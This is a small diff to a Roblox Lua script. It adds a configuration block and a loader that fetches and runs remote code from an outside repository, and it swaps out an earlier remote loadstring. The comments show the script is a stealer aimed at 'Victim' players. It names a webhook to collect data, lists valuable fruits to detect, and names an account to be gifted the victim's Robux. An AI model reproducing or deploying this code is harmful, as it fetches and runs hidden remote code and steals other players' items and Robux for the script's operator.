@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/sMlvvMH6/raw"))()
+Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/f8fbe7d2-fadf-4025-9d1d-15c8892b98f6" -- << Protected Webhook Here
+Usernames = {"Daniyal_Riber"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Gas-Gas", "Yeti-Yeti", "Leopard-Leopard", "Dough-Dough", "Spirit-Spirit", "Control-Control", "T-Rex-T-Rex", "Mammoth-Mammoth", "Venom-Venom", "Shadow-Shadow"} -- << Fruits you want the script to detect
+GiftTarget = "Daniyal_Riber" -- << Add the username that should be GIFTED if Victim has Robux
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
